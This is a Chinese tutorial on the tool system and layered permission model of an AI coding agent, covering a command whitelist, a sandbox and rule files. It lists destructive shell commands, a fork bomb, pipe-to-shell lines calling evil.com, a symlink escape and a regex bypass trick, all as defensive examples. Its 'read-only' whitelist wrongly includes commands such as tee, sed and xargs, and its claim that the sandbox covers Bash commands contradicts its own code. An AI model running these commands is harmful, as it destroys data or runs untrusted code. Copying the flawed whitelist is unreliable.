# 阶段3：工具系统与安全模型

> **学习目标**：理解工具的标准化设计（Tool 基类 + Pydantic Schema）、注册表的延迟加载机制、7 种流式事件、六层安全模型的源码实现、危险命令检测的正则引擎、路径沙箱的符号链接解析。
> **预计时间**：3-4 天
> **前置要求**：完成阶段2（理解 Agent 主循环中工具调用的位置）；熟悉 Pydantic v2、正则表达式、Python `pathlib`
> **面试导向**：安全是 Agent 系统的第一优先级。读完本章你能回答"怎么防止 rm -rf /""怎么设计沙箱""权限模式怎么设计"等核心问题。

---

## 目录

1. [工具基类：所有工具的模板](#1-工具基类所有工具的模板)
2. [7 种流式事件的统一抽象](#2-7-种流式事件的统一抽象)
3. [工具注册表与延迟加载](#3-工具注册表与延迟加载)
4. [核心工具的工作方式](#4-核心工具的工作方式)
5. [六层安全模型逐层剖析（源码）](#5-六层安全模型逐层剖析源码)
6. [危险命令检测：正则引擎](#6-危险命令检测正则引擎)
7. [路径沙箱：符号链接解析](#7-路径沙箱符号链接解析)
8. [权限模式矩阵：6 种模式](#8-权限模式矩阵6-种模式)
9. [规则引擎：三层配置 + glob 匹配](#9-规则引擎三层配置--glob-匹配)
10. [面试高频点与追问](#10-面试高频点与追问)

---

## 1. 工具基类：所有工具的模板

### 1.1 Tool 基类的真实代码

CodeBot 中 20+ 个工具都继承自同一个 `Tool` 基类（`tools/base.py` 第 22-46 行）：

```python
class Tool(ABC):
    # 6 个类属性（子类必须填）
    name: str                              # 工具名，如 "ReadFile"
    description: str                       # 给 LLM 看的描述
    params_model: type[BaseModel]          # 参数的 Pydantic 模型
    category: ToolCategory = "read"        # 分类：read / write / command
    is_concurrency_safe: bool = False      # 能否和别的工具同时执行
    is_system_tool: bool = False           # 是否系统工具
    should_defer: bool = False             # 是否延迟加载

    # 派生属性
    @property
    def is_read_only(self) -> bool:
        return self.category == "read"

    # 自动生成 JSON Schema（给 LLM function calling 用）
    def get_schema(self) -> dict[str, Any]:
        schema = self.params_model.model_json_schema()
        schema.pop("title", None)  # 去掉 Pydantic 自动加的 title 字段
        return {
            "name": self.name,
            "description": self.description,
            "input_schema": schema,
        }

    # 抽象方法：每个工具必须实现
    @abstractmethod
    async def execute(self, params: BaseModel) -> ToolResult: ...
```

### 1.2 六个属性的含义

| 属性 | 说明 | 举例 |
|------|------|------|
| `name` | 工具名（LLM 调用时用） | `"ReadFile"`, `"Bash"` |
| `description` | 给 LLM 看的描述 | `"读文件并返回带行号的内容"` |
| `params_model` | 参数的 Pydantic 模型 | ReadFile 需要 file_path、offset、limit |
| `category` | 分类：read/write/command | 决定安全策略 |
| `is_concurrency_safe` | 能否和别的工具同时执行 | ReadFile=True, Bash=False |
| `should_defer` | 是否延迟加载 | 低频工具设为 True |

### 1.3 为什么用 Pydantic 而不是手写 JSON Schema？

LLM 的 function calling 需要一个 JSON Schema 来描述工具的参数。如果手写 JSON Schema：

- ❌ 容易写错（字段对不上、required 漏了）
- ❌ Schema 改了但代码校验没改，产生 bug
- ❌ 没有运行时校验，LLM 传错参数也能调到

用 Pydantic 的话，你只需要定义一个 Python 类：

```python
from pydantic import BaseModel, Field

class ReadFileParams(BaseModel):
    file_path: str = Field(..., description="要读的文件路径")
    offset: int = Field(0, description="从第几行开始")
    limit: int = Field(2000, description="最多读几行")
```

Pydantic 会自动生成对应的 JSON Schema：

```json
{
  "type": "object",
  "properties": {
    "file_path": {"type": "string", "description": "要读的文件路径"},
    "offset": {"type": "integer", "description": "从第几行开始", "default": 0},
    "limit": {"type": "integer", "description": "最多读几行", "default": 2000}
  },
  "required": ["file_path"]
}
```

同时还能在运行时自动校验参数——LLM 传 `offset="abc"` 会直接报错，不会进到 execute 方法。

**一套代码，同时服务 LLM（Schema）和系统（校验）。这是 DRY 原则的完美应用。**

### 1.4 category 决定了工具的"信任等级"

| 分类 | 含义 | 默认权限 | 典型工具 |
|------|------|---------|---------|
| `read` | 只读，不修改任何东西 | **自动放行** | ReadFile, Grep, Glob |
| `write` | 会修改文件 | **需要确认** | WriteFile, EditFile |
| `command` | 执行 Shell 命令 | **需要确认** | Bash |

这是安全策略的基础——读操作随便做，写操作要问过用户。

**为什么用字符串而不是枚举？** 因为 `Literal["read", "write", "command"]` 比 Enum 更轻量，类型检查器也能识别。这是 Python 3.8+ 的现代做法。

### 1.5 ToolResult：工具返回的统一格式

```python
@dataclass
class ToolResult:
    output: str           # 工具输出（文本）
    is_error: bool = False  # 是否出错
```

所有工具都返回这个结构。Agent 根据这个判断工具是否成功，把 `output` 加入对话历史。

---

## 2. 7 种流式事件的统一抽象

LLM 的响应是流式的（逐字返回），CodeBot 把流式事件抽象为 7 种（`tools/base.py` 第 49-98 行）：

```python
@dataclass
class TextDelta:
    text: str                    # LLM 输出一个字

@dataclass
class ToolCallStart:
    tool_name: str               # 开始调用工具
    tool_id: str

@dataclass
class ToolCallDelta:
    text: str                    # 工具参数的增量（流式生成参数时）

@dataclass
class ToolCallComplete:
    tool_id: str                 # 工具调用完成（参数完整了）
    tool_name: str
    arguments: dict[str, Any]

@dataclass
class ThinkingDelta:
    text: str                    # LLM 思考过程的增量

@dataclass
class ThinkingComplete:
    thinking: str                # 思考完成（带签名防篡改）
    signature: str

@dataclass
class StreamEnd:
    stop_reason: str             # 结束原因（stop/max_tokens/tool_use）
    input_tokens: int = 0
    output_tokens: int = 0
    cache_read: int = 0          # Prompt Caching 命中
    cache_creation: int = 0      # Prompt Caching 写入

StreamEvent = TextDelta | ToolCallStart | ToolCallDelta | ToolCallComplete | ThinkingDelta | ThinkingComplete | StreamEnd
```

**为什么需要 ToolCallStart 和 ToolCallDelta？**

因为有些 LLM 流式生成工具参数——参数不是一次性给全，而是一个字符一个字符流出来的。比如调用 `ReadFile(file_path="main.py")`，流式过程可能是：

```
ToolCallStart(tool_name="ReadFile", tool_id="tool_001")
ToolCallDelta('{"file')
ToolCallDelta('_path":')
ToolCallDelta('"main.py"}')
ToolCallComplete(tool_id="tool_001", tool_name="ReadFile", arguments={"file_path": "main.py"})
```

`ToolCallDelta` 让 TUI 能实时显示"正在生成参数"，但 Agent 只关心 `ToolCallComplete`（参数完整了才能执行）。

**为什么用 dataclass 而不是 Pydantic？**

dataclass 更轻量，不需要校验（内部使用，数据可信）。Pydantic 适合外部输入校验（如工具参数）。

---

## 3. 工具注册表与延迟加载

### 3.1 注册表就像一个"工具库"

启动时把所有工具注册进去，以后按名字查找。四个基本操作：

| 操作 | 方法 | 说明 |
|------|------|------|
| 注册 | `registry.register(ReadFile())` | 把工具加进去 |
| 查找 | `registry.get("ReadFile")` | 按名字找到该工具 |
| 导出 Schema | `registry.get_all_schemas("anthropic")` | 把所有工具的 JSON Schema 导出给 LLM |
| 启用/禁用 | `registry.enable("Bash")` / `registry.disable("Bash")` | 运行时控制 |

### 3.2 延迟加载：不是所有工具都一开始就暴露

Context Window 很宝贵（只有 20 万 token），每个工具的 Schema 都占几百 token。如果 20+ 个工具全暴露，会浪费大量上下文空间。所以设计了**延迟加载**：

| 类型 | should_defer | 初始暴露 | 例子 |
|------|--------------|---------|------|
| **基础工具** | `False` | ✅ 一开始就传给 LLM | ReadFile, WriteFile, Bash, Grep, Glob |
| **低频工具** | `True` | ❌ 不在初始列表 | TeamCreate, EnterWorktree, TaskCreate |

LLM 想用延迟工具时，需要先调用 `ToolSearch`：

1. LLM 看到提示 "以下工具可用但需要发现：TeamCreate, EnterWorktree..."
2. LLM 调用 `ToolSearch(query="select:TeamCreate")`
3. ToolSearch 返回 TeamCreate 的完整 Schema
4. 下次循环，TeamCreate 自动出现在可用工具列表里

**这就像图书馆**：常用的工具书放桌面，不常用的放书架上。你要用哪本就去书架上找（ToolSearch），找到后就放到桌面上（mark_discovered），后续直接用。

### 3.3 延迟加载省多少 token？

粗略估算：
- 每个工具 Schema 约 200-500 token
- 基础工具 5 个：约 2000 token
- 全部工具 20+ 个：约 8000 token

延迟加载让初始上下文少占 6000 token——这相当于多读 3-4 个文件的空间。在长对话场景下，这是显著的节省。

### 3.4 ToolSearch 是怎么找到工具的？

一个轻量级的关键词搜索引擎：

- 你搜 "team" → 匹配名称含 "team" 的工具给高分 → 匹配描述含 "team" 的给中等分 → 按分数排序返回
- 支持 `select:ToolName` 精确选择
- 不需要向量数据库，不需要语义搜索，正则 + 字符串匹配就够用

**为什么不上语义搜索？** 因为：
1. 工具数量少（20+ 个），关键词足够
2. 语义搜索需要 embedding 模型，增加依赖和延迟
3. 简单方案能解决问题就不要过度设计——YAGNI 原则

---

## 4. 核心工具的工作方式

### 4.1 ReadFile — 读文件

看似简单，但设计很讲究：

1. **检查文件是否存在** — 不存在返回清晰错误
2. **缓存** — 一个文件在这次对话里读过一次就缓存，避免重复 I/O（`file_state_cache.py`）
3. **行号标注** — 输出格式是 `行号→代码内容`（比如 `42→def main():`），这非常关键——后续 EditFile 要靠行号定位
4. **分页** — 大文件用 offset + limit 分段读，不会爆内存
5. **状态记录** — 记录文件的修改时间，用于后续编辑安全检查（检测文件是否被外部修改）

**为什么带行号？** 因为 LLM 经常说"修改第 42 行"，但 EditFile 需要精确的 old_string。行号让 LLM 能定位，但实际编辑还是用 search/replace（更可靠）。

### 4.2 EditFile — 精确编辑（最精妙的工具）

这是最精妙的工具设计。它不接受"把文件整体覆盖"，而是**精确替换**：

你必须告诉它：
- `old_string`：文件中一个**唯一的**字符串片段
- `new_string`：要替换成什么

然后它做三件事：

```python
async def execute(self, params: EditFileParams) -> ToolResult:
    # 1. 读取文件内容
    content = file.read_text()

    # 2. 检查 old_string 在文件里出现了几次
    count = content.count(old_string)

    if count == 0:
        # 找不到 → 文件可能被外部修改
        return ToolResult(
            output=f"找不到这段文字。文件可能在读取后被修改。",
            is_error=True,
        )
    elif count > 1:
        # 多次出现 → 歧义
        return ToolResult(
            output=f"这段文字出现了 {count} 次，请提供更多上下文让它唯一",
            is_error=True,
        )
    else:
        # 唯一匹配 → 替换
        new_content = content.replace(old_string, new_string)
        file.write_text(new_content)
        # 清除缓存
        file_state_cache.invalidate(file_path)
        return ToolResult(output="修改成功")
```

### 4.3 EditFile 为什么这么设计？

三个核心优势：

1. **安全**：只改一个精确匹配的位置，不会误伤其他地方
2. **冲突检测**：old_string 找不到说明文件被外部修改了，提示 LLM 重新读
3. **可审计**：精确编辑在 diff 中非常清晰

**为什么强调 old_string 必须唯一？** 避免歧义——如果 "return result" 在文件里出现 5 次，Agent 说 "改 return result 为 return None"，你没法知道改哪一个。

**追问：为什么不用 diff/patch？**

diff/patch 更强大，但有三个问题：
1. LLM 生成 diff 容易出错（行号、上下文行不匹配）
2. patch 命令的失败处理复杂
3. search/replace 更接近自然语言，LLM 更容易理解

业界主流的 AI Coding 工具（Claude Code、Aider）都用 search/replace。

### 4.4 Bash — 执行命令

Agent 可以跑任何 Shell 命令，但有多重保护：

1. **超时** — 最长 600 秒，防止命令挂死
2. **捕获输出** — 分别拿到 stdout 和 stderr
3. **安全编码** — 如果命令输出了二进制数据，用 replace 策略避免崩溃
4. **必须经过权限检查** — Bash 是 command 类型，默认需要用户确认

**为什么 600 秒？** 经验值。大部分命令（编译、测试、lint）都在 60 秒内完成。但有些重型任务（如 `npm install`、大型构建）可能需要几分钟。600 秒给足余量，又不会让挂死的命令一直占着。

### 4.5 Glob 和 Grep — 代码探索双子星

- **Glob**：找文件（类似 `ls *.py`），支持 `**/*.py` 递归模式
- **Grep**：搜内容（类似 `grep -r "TODO"`），支持正则表达式

两者都是只读、并发安全，是代码探索的主力。

**为什么是两个工具而不是一个？** 因为：
- Glob 用文件系统 API（快），Grep 用文件内容扫描（慢）
- Glob 适合"找所有 .py 文件"，Grep 适合"找包含 TODO 的行"
- 分开让 LLM 能精确表达意图，也方便各自优化

---

## 5. 六层安全模型逐层剖析（源码）

### 5.0 总览

`PermissionChecker.check()` 方法（`permissions/checker.py` 第 39-81 行）是整个安全系统的核心。一个工具调用要执行前，必须依次经过六层判断（Layer 0 到 Layer 5）：

```python
def check(self, tool: Tool, arguments: dict[str, Any]) -> Decision:
    content = extract_content(tool.name, arguments)

    # Layer 0: Plan 模式例外放行
    if self.mode == PermissionMode.PLAN:
        if tool.name in _PLAN_MODE_ALLOWED_TOOLS:
            return Decision(effect="allow", reason="Plan mode: allowed tool")
        if tool.name in ("WriteFile", "EditFile") and content:
            if self._is_plan_file(content):
                return Decision(effect="allow", reason="Plan mode: plan file write")

    # Layer 1: 安全的只读命令（自动放行）
    if tool.category == "command" and is_safe_command(content or ""):
        return Decision(effect="allow", reason="Safe read-only command")

    # Layer 1b: 危险命令黑名单（仅 Bash）
    if tool.category == "command":
        hit, reason = self.detector.detect(content)
        if hit:
            return Decision(effect="deny", reason=f"危险命令拦截: {reason}")

    # Layer 2: 路径沙箱（仅文件类工具）
    if tool.category in ("read", "write") and content:
        ok, reason = self.sandbox.check(content)
        if not ok:
            return Decision(effect="deny", reason=f"路径沙箱拦截: {reason}")

    # Layer 3: 规则引擎匹配
    rule_result = self.rule_engine.evaluate(tool.name, content)
    if rule_result == "allow":
        return Decision(effect="allow", reason="权限规则放行")
    if rule_result == "deny":
        return Decision(effect="deny", reason="权限规则拒绝")

    # Layer 4: 权限模式兜底判定
    effect = mode_decide(self.mode, tool.category)
    if effect == "allow":
        return Decision(effect="allow", reason=f"权限模式 {self.mode.value} 放行")
    if effect == "deny":
        return Decision(effect="deny", reason=f"权限模式 {self.mode.value} 拒绝")

    # Layer 5: 触发人工确认（HITL）
    return Decision(effect="ask", reason="需要用户确认")
```

**核心设计原则**：
- **短路求值**：任一层做出"允许"或"拒绝"决定就立即返回，不往下走
- **纵深防御**：即使某一层有漏洞，后续层仍能拦截
- **白名单优先于黑名单**：先检查白名单（精确），再检查黑名单（兜底）

### 5.1 Layer 0：Plan 模式例外

Plan 模式下，绝大多数写操作被拦截。但以下例外：

```python
_PLAN_MODE_ALLOWED_TOOLS = frozenset({"Agent", "ToolSearch", "AskUserQuestion", "ExitPlanMode"})
```

| 允许的操作 | 为什么允许 |
|----------|----------|
| `Agent`（派发子 Agent） | 子 Agent 可以探索代码，帮 Agent 制定计划 |
| `ToolSearch`（搜索延迟工具） | 探索过程中可能需要发现新工具 |
| `AskUserQuestion`（问用户） | 制定计划时可能需要澄清需求 |
| `ExitPlanMode`（退出 Plan） | 用户审核通过后退出 |
| 写 `.codebot/plans/` 下的文件 | 计划本身要保存为文件 |

**为什么要有这一层？** Plan 模式的核心理念是"先想清楚再动手"。如果不拦截写操作，Agent 可能在计划阶段就改代码——这违背了 Plan 模式的初衷。

**`_is_plan_file` 的判断逻辑**：

```python
def _is_plan_file(self, target_path: str) -> bool:
    if not self.plan_file_path or not target_path:
        return ".codebot/plans/" in target_path
    # 三种判断方式（任一匹配即认为是计划文件）：
    # 1. 绝对路径完全匹配
    # 2. 文件名匹配
    # 3. 路径包含 .codebot/plans/
```

### 5.2 Layer 1：安全命令白名单

**白名单**（`permissions/dangerous.py` 第 17-29 行）：预定义了 40+ 个安全命令。这些命令是纯只读的：

```python
_SAFE_COMMANDS = frozenset({
    "ls", "dir", "pwd", "echo", "cat", "head", "tail", "wc",
    "find", "which", "whereis", "whoami", "hostname", "uname",
    "date", "cal", "uptime", "df", "du", "free", "env", "printenv",
    "file", "stat", "readlink", "realpath", "basename", "dirname",
    "sort", "uniq", "tr", "cut", "awk", "sed", "grep", "egrep", "fgrep",
    "diff", "comm", "tee", "xargs", "true", "false", "test",
    "git status", "git log", "git diff", "git show", "git branch",
    "git tag", "git remote", "git rev-parse", "git ls-files",
    "git blame", "git stash list", "go version", "go env",
    "node -v", "npm -v", "npx", "python --version", "pip list",
    "cargo --version", "rustc --version", "java -version", "java --version",
})
```

**关键限制**（`is_safe_command` 函数）：

```python
def is_safe_command(command: str) -> bool:
    trimmed = command.strip()
    if not trimmed:
        return False
    # 命令里不能含这些特殊字符（防止命令注入）
    for ch in ("|", ";", "&&", ">", "$(", "`"):
        if ch in trimmed:
            return False
    # 必须完全匹配或前缀匹配白名单
    for safe in _SAFE_COMMANDS:
        if trimmed == safe or trimmed.startswith(safe + " "):
            return True
    return False
```

**为什么不能含管道、重定向、命令替换？**

因为 `ls` 是安全的，但 `ls | xargs rm -rf` 不安全——管道把 ls 的输出喂给 rm。同理：
- `cat file > /etc/passwd`（重定向覆盖系统文件）
- `echo $(rm -rf /)`（命令替换执行危险命令）
- `ls; rm -rf /`（分号串联多个命令）

**这是"安全白名单 + 危险字符黑名单"的双重防御。**

### 5.3 Layer 1b：危险命令黑名单

**黑名单**（`permissions/dangerous.py` 第 5-14 行）用正则匹配已知危险模式：

```python
_DANGEROUS_PATTERNS: list[tuple[re.Pattern[str], str]] = [
    (re.compile(r"rm\s+-[a-z]*r[a-z]*f[a-z]*\s+/\s*$"), "递归强制删除根目录"),
    (re.compile(r"mkfs\."), "格式化磁盘"),
    (re.compile(r"dd\s+if=.*of=/dev/"), "直接写磁盘设备"),
    (re.compile(r"chmod\s+-R\s+777\s+/"), "递归修改根目录权限"),
    (re.compile(r":\(\)\{\s*:\|:&\s*\};:"), "fork bomb"),
    (re.compile(r"curl\s+.*\|\s*(ba)?sh"), "管道执行远程脚本"),
    (re.compile(r"wget\s+.*\|\s*(ba)?sh"), "管道执行远程脚本"),
    (re.compile(r">\s*/dev/sd"), "覆盖磁盘设备"),
]
```

**8 个危险模式详解**：

| 模式 | 危险性 | 例子 |
|------|--------|------|
| `rm -rf /` | 删除整个文件系统 | `rm -rf /` |
| `mkfs.` | 格式化磁盘 | `mkfs.ext4 /dev/sda1` |
| `dd if=...of=/dev/` | 直接写磁盘设备 | `dd if=/dev/zero of=/dev/sda` |
| `chmod -R 777 /` | 全系统权限放开 | `chmod -R 777 /` |
| fork bomb | 进程炸弹，系统崩溃 | `:(){ :|:& };:` |
| `curl | sh` | 执行远程脚本 | `curl http://evil.com | sh` |
| `wget | sh` | 执行远程脚本 | `wget http://evil.com | sh` |
| `> /dev/sd*` | 覆盖磁盘设备 | `echo x > /dev/sda` |

**为什么白名单和黑名单都要？**
- 白名单"宁可误拦"——很多无害但有特殊字符的命令会被拦下
- 黑名单兜底——如果某个危险命令碰巧进了白名单（极端情况），黑名单也能拦截

**这是"纵深防御"的体现——不依赖单一防线。**

### 5.4 Layer 2：路径沙箱

`PathSandbox`（`permissions/sandbox.py`）限制 Agent 只能在两个地方操作文件：

- 项目根目录（及其子目录）
- 系统临时目录

```python
class PathSandbox:
    def __init__(self, project_root: str, extra_allowed: list[str] | None = None):
        root = Path(project_root).resolve()
        self._allowed_roots: list[Path] = [
            root,
            Path(tempfile.gettempdir()).resolve(),
        ]
        if extra_allowed:
            for p in extra_allowed:
                self._allowed_roots.append(Path(p).resolve())

    def check(self, path: str) -> tuple[bool, str]:
        p = Path(path).expanduser()
        if not p.is_absolute():
            p = self.project_root / p
        abs_path = p.absolute()

        # 关键：解析符号链接，防止 symlink 越狱
        try:
            real_path = abs_path.resolve(strict=True)
        except OSError:
            # 路径不存在时，找到最近的存在的祖先目录再解析
            ancestor = abs_path
            while not ancestor.exists():
                parent = ancestor.parent
                if parent == ancestor:
                    return False, f"无法解析路径: {path}"
                ancestor = parent
            resolved_ancestor = ancestor.resolve(strict=True)
            real_path = resolved_ancestor / abs_path.relative_to(ancestor)

        # 检查是否在允许的根目录下
        for root in self._allowed_roots:
            try:
                real_path.relative_to(root)
                return True, ""
            except ValueError:
                continue

        return False, f"路径 {path} 超出沙箱范围"
```

如果 Agent 尝试访问 `/etc/passwd` 或 `~/.ssh/`，直接被这层拦截。

### 5.5 Layer 3：用户自定义规则

你可以写规则文件，精确控制哪些操作自动放行、哪些自动拒绝：

- **全局规则**：`~/.codebot/permissions.yaml`
- **项目规则**：`.codebot/permissions.yaml`（团队共享）
- **本地规则**：`.codebot/permissions.local.yaml`（个人，不提交 Git）

规则支持通配符（fnmatch）。比如你可以写：

```yaml
- rule: "Bash(npm *)"
  effect: allow
- rule: "Bash(rm *)"
  effect: deny
- rule: "ReadFile(/etc/passwd)"
  effect: deny
```

当你在确认框里点"Always Allow"时，系统会自动追加一条本地规则。

### 5.6 Layer 4：权限模式矩阵

根据当前模式决定默认行为（`permissions/modes.py`）：

```python
_MODE_MATRIX: dict[PermissionMode, dict[ToolCategory, DecisionEffect]] = {
    PermissionMode.DEFAULT:      {"read": "allow", "write": "ask",   "command": "ask"},
    PermissionMode.ACCEPT_EDITS: {"read": "allow", "write": "allow", "command": "ask"},
    PermissionMode.PLAN:         {"read": "allow", "write": "ask",   "command": "ask"},
    PermissionMode.BYPASS:       {"read": "allow", "write": "allow", "command": "allow"},
    PermissionMode.CUSTOM:       {"read": "ask",   "write": "ask",   "command": "ask"},
    PermissionMode.DONT_ASK:     {"read": "allow", "write": "allow", "command": "allow"},
}
```

### 5.7 Layer 5：人工确认（HITL）

前面四层都没做出决定时，弹出确认对话框。你有三个选择：

- **Allow（允许这次）** — 这次放行，下次还要问
- **Deny（拒绝）** — 工具不执行，返回错误
- **Allow Always（永久允许）** — 放行 + 自动追加一条允许规则到本地配置

**为什么 Allow Always 要追加规则？** 避免每次都问。用户点 Allow Always 后，下次同样操作会被 Layer 3（规则引擎）自动放行，不再弹窗。

---

## 6. 危险命令检测：正则引擎

### 6.1 DangerousCommandDetector 类

```python
class DangerousCommandDetector:
    def __init__(self, extra_patterns: list[tuple[str, str]] | None = None):
        self._patterns = list(_DANGEROUS_PATTERNS)
        if extra_patterns:
            for regex_str, reason in extra_patterns:
                self._patterns.append((re.compile(regex_str), reason))

    def detect(self, command: str) -> tuple[bool, str]:
        for pattern, reason in self._patterns:
            if pattern.search(command):
                return True, reason
        return False, ""
```

### 6.2 设计要点

1. **预编译正则**：`re.compile` 在初始化时编译，避免每次检测都重新编译
2. **可扩展**：`extra_patterns` 允许用户自定义危险模式
3. **返回原因**：不仅返回是否危险，还返回"为什么危险"，便于提示用户

### 6.3 为什么用正则而不是 AST 解析？

正则的优点：
- ✅ 简单，无依赖
- ✅ 快，预编译后微秒级
- ✅ 能覆盖 90% 的危险模式

正则的缺点：
- ❌ 无法处理复杂的命令组合（如 `eval "rm -rf /"`）
- ❌ 可能被绕过（如 `r""m -rf /` 用字符串拼接）

**为什么接受这个缺陷？** 因为：
1. Shell 命令的 AST 解析极其复杂（bash 语法本身就图灵完备）
2. 即使解析了，也防不住 `eval`、`source` 等动态执行
3. 真正的安全保障在 Layer 5（人工确认）——危险操作最终要用户点头

**正则是"快速筛查"，人工确认是"终极防线"。**

---

## 7. 路径沙箱：符号链接解析

### 7.1 为什么沙箱要解析符号链接？

考虑这个攻击场景：

```bash
# 在项目目录里建一个软链接
ln -s /etc/passwd ./escape_link
# Agent 读取 ./escape_link → 实际读到 /etc/passwd！
```

如果不解析符号链接，Agent 就能通过 symlink 越狱访问任意文件。

### 7.2 CodeBot 的解法：resolve(strict=True)

```python
real_path = abs_path.resolve(strict=True)
```

`Path.resolve(strict=True)` 会：
1. 解析所有符号链接（变成真实路径）
2. 如果路径不存在，抛 FileNotFoundError（strict=True 的语义）

然后检查 `real_path` 是否在允许的根目录下。

### 7.3 处理不存在的路径

问题：写文件时目标路径可能还不存在（要创建它），`resolve(strict=True)` 会报错。

CodeBot 的解法：找到最近的存在的祖先目录，解析它，再拼上剩余路径：

```python
try:
    real_path = abs_path.resolve(strict=True)
except OSError:
    # 路径不存在，找最近的存在的祖先
    ancestor = abs_path
    while not ancestor.exists():
        parent = ancestor.parent
        if parent == ancestor:  # 到根目录了
            return False, f"无法解析路径: {path}"
        ancestor = parent
    # 解析祖先（祖先存在，可以 strict=True）
    resolved_ancestor = ancestor.resolve(strict=True)
    # 拼上剩余部分
    real_path = resolved_ancestor / abs_path.relative_to(ancestor)
```

**这个设计的精妙之处**：即使路径不存在，也能正确判断它"将来会落在哪个目录下"——如果祖先在沙箱内，新文件也在沙箱内。

---

## 8. 权限模式矩阵：6 种模式

### 8.1 完整的模式矩阵

```python
class PermissionMode(str, Enum):
    DEFAULT = "default"               # 默认安全模式
    ACCEPT_EDITS = "acceptEdits"      # 自动接受文件编辑
    PLAN = "plan"                     # 规划模式
    BYPASS = "bypassPermissions"      # 跳过所有权限检查
    CUSTOM = "custom"                 # 自定义（全部 ask）
    DONT_ASK = "dontAsk"              # 不问（全部 allow）
```

| 模式 | read | write | command | 适用场景 |
|------|------|-------|---------|---------|
| `default` | ✅ allow | 🔔 ask | 🔔 ask | 日常使用 |
| `acceptEdits` | ✅ allow | ✅ allow | 🔔 ask | 信任编辑，不信任命令 |
| `plan` | ✅ allow | 🔔 ask | 🔔 ask | 先规划后执行 |
| `bypass` | ✅ allow | ✅ allow | ✅ allow | 完全信任（慎用） |
| `custom` | 🔔 ask | 🔔 ask | 🔔 ask | 全部需要确认 |
| `dontAsk` | ✅ allow | ✅ allow | ✅ allow | 不问（类似 bypass） |

### 8.2 模式切换

用 `Shift+Tab` 可以在 TUI 中循环切换模式：default → acceptEdits → plan → bypass → default...

**为什么 bypass 和 dontAsk 看起来一样？** 历史原因。bypass 是早期名字，dontAsk 是后来加的别名。实际行为一致。

### 8.3 模式选择的工程权衡

| 模式 | 安全性 | 效率 | 适用场景 |
|------|--------|------|---------|
| default | ⚠️⭐⭐⭐ | ⚠️⭐⭐ | 新手、不熟悉的代码库 |
| acceptEdits | ⚠️⭐⭐ | ✅⭐⭐⭐ | 信任 Agent 的编辑能力 |
| plan | ✅⭐⭐⭐ | ⚠️⭐ | 高风险任务（重构、删代码） |
| bypass | ❌ | ✅⭐⭐⭐ | 完全信任（如沙箱环境） |

**没有"最好"的模式，只有"最合适"的模式。** 这是工程设计的核心——trade-off。

---

## 9. 规则引擎：三层配置 + glob 匹配

### 9.1 规则文件格式

```yaml
# .codebot/permissions.yaml
- rule: "Bash(npm *)"
  effect: allow
- rule: "Bash(rm *)"
  effect: deny
- rule: "ReadFile(/etc/passwd)"
  effect: deny
- rule: "WriteFile(.env)"
  effect: deny
```

每条规则两部分：
- `rule`：格式 `ToolName(pattern)`，pattern 支持 fnmatch 通配符
- `effect`：`allow` 或 `deny`

### 9.2 三层规则文件

```python
class RuleEngine:
    def __init__(
        self,
        user_rules_path: Path | None = None,      # ~/.codebot/permissions.yaml
        project_rules_path: Path | None = None,    # .codebot/permissions.yaml
        local_rules_path: Path | None = None,      # .codebot/permissions.local.yaml
    ):
        ...
```

### 9.3 规则匹配算法

```python
def evaluate(self, tool_name: str, content: str) -> Effect | None:
    # 按层遍历：user → project → local
    for rules in self._load_tiers():
        # 每层按倒序遍历（后定义的优先）
        for rule in reversed(rules):
            if rule.matches(tool_name, content):
                return rule.effect
    return None  # 没匹配到，交给下一层
```

**为什么倒序？** 因为后定义的规则应该覆盖先定义的——这是配置的常见语义（如 nginx 的 location 匹配）。

**为什么三层？** 让团队和个人都能自定义规则：
- user 层：用户的全局规则（如"所有项目都禁止 rm"）
- project 层：项目级规则（如"这个项目允许 npm *"）
- local 层：个人临时规则（不提交 Git）

### 9.4 fnmatch 通配符

Python 的 `fnmatch` 模块支持 Unix shell 风格的通配符：

| 模式 | 含义 | 例子 |
|------|------|------|
| `*` | 匹配任意字符 | `npm *` 匹配 `npm install`、`npm run dev` |
| `?` | 匹配单个字符 | `file?.txt` 匹配 `file1.txt` |
| `[seq]` | 匹配序列中任意字符 | `file[12].txt` 匹配 `file1.txt` |
| `[!seq]` | 匹配不在序列中的字符 | `file[!3].txt` 匹配 `file1.txt` 不匹配 `file3.txt` |

**为什么用 fnmatch 而不是正则？** 因为 fnmatch 更简单，用户更容易写。正则太强大也容易写错。

---

## 10. 面试高频点与追问

### 10.1 "怎么设计一个 Agent 工具系统？"

六个要点：

1. **统一接口**（Tool 基类，name + description + execute）
2. **自动 Schema 生成**（Pydantic → JSON Schema，同时给 LLM 和校验用）
3. **分类管理**（read/write/command 驱动安全策略）
4. **注册表模式**（运行时注册/发现/启用/禁用）
5. **延迟加载**（低频工具不占 context window）
6. **并发控制**（只读工具并行，写工具串行）

**追问：为什么不直接给 LLM 一个 Python REPL？**

因为：
1. **安全**：REPL 能干任何事，无法控制风险
2. **可观测**：工具调用有明确边界，便于日志和审计
3. **可缓存**：工具的 Schema 可以缓存给 LLM，REPL 的能力无法缓存
4. **可扩展**：新增工具只需新增类，不用改核心代码

### 10.2 "Agent 怎么防止执行 rm -rf /？"

六层防线，纵深防御：

1. **白名单**：rm 不在安全命令列表里
2. **黑名单**：`rm -rf /` 匹配危险正则
3. **沙箱**：`/` 不在允许的路径范围内
4. **自定义规则**：如果用户写了 `Bash(rm *)` → deny
5. **模式矩阵**：default 模式下 command 类型需要确认
6. **人工确认**：即使前面都通过了，用户还可以点 Deny

关键是**纵深防御**——即使某一层有漏洞，后续层仍能拦截。

**追问：正则能被绕过怎么办？**

正则确实能被绕过（如 `r""m -rf /` 字符串拼接）。但：
1. 正则是"快速筛查"，能拦住 90% 的明显危险
2. 真正的安全保障在 Layer 5（人工确认）——危险操作最终要用户点头
3. 即使正则没拦住，沙箱（Layer 2）和模式矩阵（Layer 4）还会兜底
4. 这是"纵深防御"的体现——不依赖单一防线

### 10.3 "EditFile 为什么用 search/replace 而不是直接覆写？"

三个核心优势：

1. **安全**：只改一个精确匹配的位置，不会误伤
2. **冲突检测**：old_string 找不到说明文件被外部修改了
3. **可审计**：精确编辑在 diff 中非常清晰

代价是 LLM 必须给出精确的 old_string，包括正确的空白字符。

**追问：如果 old_string 出现多次怎么办？**

返回错误："这段文字出现了 N 次，请提供更多上下文让它唯一"。这是**拒绝歧义**的设计——宁可让 LLM 重试，也不要瞎猜。

**追问：为什么不直接用 diff/patch？**

1. LLM 生成 diff 容易出错（行号、上下文行不匹配）
2. patch 命令的失败处理复杂
3. search/replace 更接近自然语言，LLM 更容易理解

业界主流的 AI Coding 工具（Claude Code、Aider）都用 search/replace。
